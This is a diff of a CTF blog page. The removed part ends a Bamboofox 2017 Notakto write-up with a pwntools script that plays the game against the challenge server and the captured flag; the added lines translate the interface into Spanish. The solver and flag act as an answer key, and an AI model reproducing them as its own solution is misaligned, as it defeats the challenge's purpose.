class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"bamboofox.cs.nctu.edu.tw"</span>,<span class="number">58793</span>)</span><br><span class="line"></span><br><span class="line">gameBoard = [[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>],[<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insertToGameboard</span><span class="params">(move)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> move &lt;= <span class="number">2</span>:</span><br><span class="line">		gameBoard[<span class="number">0</span>][move] = <span class="string">"X"</span></span><br><span class="line">	<span class="keyword">elif</span> move &gt; <span class="number">2</span> <span class="keyword">and</span> move &lt; <span class="number">6</span>:</span><br><span class="line">		gameBoard[<span class="number">1</span>][move<span class="number">-3</span>] = <span class="string">"X"</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">print</span> move</span><br><span class="line">		gameBoard[<span class="number">2</span>][move<span class="number">-6</span>] = <span class="string">"X"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">countTotalX</span><span class="params">()</span>:</span></span><br><span class="line">	total = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">			<span class="keyword">if</span> gameBoard[i][j] == <span class="string">'X'</span>:</span><br><span class="line">				total += <span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> total</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isWin</span><span class="params">(x,y)</span>:</span></span><br><span class="line">	buf = gameBoard[x][y]</span><br><span class="line">	gameBoard[x][y] = <span class="string">"X"</span></span><br><span class="line">	<span class="keyword">if</span> gameBoard[x][<span class="number">0</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[x][<span class="number">1</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[x][<span class="number">2</span>] == <span class="string">"X"</span>:</span><br><span class="line">		gameBoard[x][y] = buf</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">if</span> gameBoard[<span class="number">0</span>][y] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">1</span>][y] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">2</span>][y] == <span class="string">"X"</span>:</span><br><span class="line">		gameBoard[x][y] = buf</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">if</span> gameBoard[<span class="number">0</span>][<span class="number">0</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">1</span>][<span class="number">1</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">2</span>][<span class="number">2</span>] == <span class="string">"X"</span>:</span><br><span class="line">		gameBoard[x][y] = buf</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">if</span> gameBoard[<span class="number">0</span>][<span class="number">2</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">1</span>][<span class="number">1</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">2</span>][<span class="number">0</span>] == <span class="string">"X"</span>:</span><br><span class="line">		gameBoard[x][y] = buf</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">if</span> gameBoard[<span class="number">0</span>][<span class="number">0</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">0</span>][<span class="number">1</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">1</span>][<span class="number">1</span>] == <span class="string">"X"</span>:</span><br><span class="line">		gameBoard[x][y] = buf</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">if</span> gameBoard[<span class="number">0</span>][<span class="number">0</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">1</span>][<span class="number">1</span>] == <span class="string">"X"</span> <span class="keyword">and</span> countTotalX() == <span class="number">3</span>:</span><br><span class="line">		gameBoard[x][y] = buf</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">if</span> gameBoard[<span class="number">0</span>][<span class="number">1</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">1</span>][<span class="number">1</span>] == <span class="string">"X"</span> <span class="keyword">and</span> countTotalX() == <span class="number">3</span>:</span><br><span class="line">		gameBoard[x][y] = buf</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">if</span> gameBoard[<span class="number">0</span>][<span class="number">1</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">0</span>][<span class="number">2</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">1</span>][<span class="number">1</span>] == <span class="string">"X"</span> <span class="keyword">and</span> countTotalX() == <span class="number">3</span>:</span><br><span class="line">		gameBoard[x][y] = buf</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">if</span> gameBoard[<span class="number">0</span>][<span class="number">1</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">1</span>][<span class="number">2</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">1</span>][<span class="number">1</span>] == <span class="string">"X"</span> <span class="keyword">and</span> countTotalX() == <span class="number">3</span>:</span><br><span class="line">		gameBoard[x][y] = buf</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">if</span> gameBoard[<span class="number">0</span>][<span class="number">1</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">1</span>][<span class="number">2</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">0</span>][<span class="number">1</span>] == <span class="string">"X"</span> <span class="keyword">and</span> countTotalX() == <span class="number">3</span>:</span><br><span class="line">		gameBoard[x][y] = buf</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">if</span> gameBoard[<span class="number">0</span>][<span class="number">0</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">1</span>][<span class="number">1</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">1</span>][<span class="number">2</span>] == <span class="string">"X"</span> <span class="keyword">and</span> countTotalX() == <span class="number">3</span>:</span><br><span class="line">		gameBoard[x][y] = buf</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">if</span> gameBoard[<span class="number">0</span>][<span class="number">1</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">1</span>][<span class="number">1</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">2</span>][<span class="number">2</span>] == <span class="string">"X"</span> <span class="keyword">and</span> countTotalX() == <span class="number">3</span>:</span><br><span class="line">		gameBoard[x][y] = buf</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">if</span> gameBoard[<span class="number">0</span>][<span class="number">2</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">1</span>][<span class="number">2</span>] == <span class="string">"X"</span> <span class="keyword">and</span> gameBoard[<span class="number">1</span>][<span class="number">1</span>] == <span class="string">"X"</span> <span class="keyword">and</span> countTotalX() == <span class="number">3</span>:</span><br><span class="line">		gameBoard[x][y] = buf</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">	gameBoard[x][y] = buf</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findNextMove</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">			<span class="keyword">if</span> gameBoard[i][j] == <span class="string">"X"</span>:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">if</span> <span class="keyword">not</span> isWin(i,j):</span><br><span class="line">					out = gameBoard[i][j]</span><br><span class="line">					gameBoard[i][j] = <span class="string">"X"</span></span><br><span class="line">					<span class="keyword">return</span> out</span><br><span class="line">	<span class="keyword">return</span> <span class="string">"-1"</span></span><br><span class="line"></span><br><span class="line">isRestart = <span class="keyword">True</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">	res = r.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">print</span> res</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"My move"</span> <span class="keyword">in</span> res:</span><br><span class="line">		move = res[res.find(<span class="string">"move: "</span>)+<span class="number">6</span>:res.find(<span class="string">"move: "</span>)+<span class="number">7</span>]</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"[+] AI Inserted "</span> + move</span><br><span class="line">		insertToGameboard(int(move))</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"Your move"</span> <span class="keyword">in</span> res <span class="keyword">and</span> <span class="string">"YOU WIN"</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">		<span class="keyword">if</span> gameBoard == [[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>],[<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]]:</span><br><span class="line">			r.sendline(<span class="string">"4"</span>)</span><br><span class="line">			gameBoard[<span class="number">1</span>][<span class="number">1</span>] = <span class="string">"X"</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			nextMove = findNextMove()</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"[+] Player Inserted"</span> + str(nextMove)</span><br><span class="line">			<span class="keyword">print</span> gameBoard</span><br><span class="line">			r.sendline(str(nextMove))</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"YOU WIN"</span> <span class="keyword">in</span> res:</span><br><span class="line">		gameBoard = [[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>],[<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]]</span><br><span class="line">		gameBoard[<span class="number">1</span>][<span class="number">1</span>] = <span class="string">"X"</span></span><br><span class="line">		r.sendline(<span class="string">"4"</span>)</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BAMBOOFOX&#123;N0tkt0_IS_fUn_iS_It&#125;</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://catpawn.github.io/2017/12/31/Bamboofox2017-toddler-notakto-revenge/" data-id="cjetvs9hn000adgw5cdsf8idj" class="article-share-link">Share</a>
+      <a data-url="https://catpawn.github.io/2018/01/01/Bamboofox2017-suck-file/" data-id="cjgaye6lg0003fkw50jjvj5vy" class="article-share-link">Compartir</a>
       
       
     </footer>
@@ -507,7 +479,7 @@
 
   <nav id="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Siguiente &raquo;</a>
   </nav>
 
 </section>
@@ -524,9 +496,9 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
+    <h3 class="widget-title">Archivos</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li></ul>
     </div>
   </div>
 
@@ -534,28 +506,28 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
+    <h3 class="widget-title">Posts recientes</h3>
     <div class="widget">
       <ul>
         
           <li>
-            <a href="/2018/03/16/NeverLanCTF2018-Turtles-All-The-Way-Down/">NeverLanCTF2018-Turtles-All-The-Way-Down</a>
+            <a href="/2018/04/22/TimisoaraCTF2018-Pshchology/">TimisoaraCTF2018-Pshchology</a>
           </li>
         
           <li>
-            <a href="/2018/03/16/PragyanCTF2018-Scientists-research/">PragyanCTF2018-Scientists-research</a>
+            <a href="/2018/04/22/TimisoaraCTF2018-ForeignLanguage/">TimisoaraCTF2018-ForeignLanguage</a>
           </li>
         
           <li>
-            <a href="/2018/01/01/Bamboofox2017-suck-file/">Bamboofox2017-suck-file</a>
+            <a href="/2018/04/22/TimisoaraCTF2018-Attendance/">TimisoaraCTF2018-Attendance</a>
           </li>
         
           <li>
-            <a href="/2018/01/01/tiny-docker-SSRF/">BamboofoxCTF2017-tiny-docker-SSRF</a>
+            <a href="/2018/04/22/TimisoaraCTF2018-cparty/">TimisoaraCTF2018-cparty</a>
           </li>
         
           <li>
-            <a href="/2018/01/01/Bamboofox2017-tiny-git/">Bamboofox2017-tiny-git</a>
+            <a href="/2018/04/22/TimisoaraCTF2018-NotYourAverageRSA/">TimisoaraCTF2018-NotYourAverageRSA</a>
           </li>
         
       </ul>
@@ -571,7 +543,7 @@
   <div class="outer">
     <div id="footer-info" class="inner">
       &copy; 2018 CatPawn<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      Construido por <a href="http://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
 </footer>
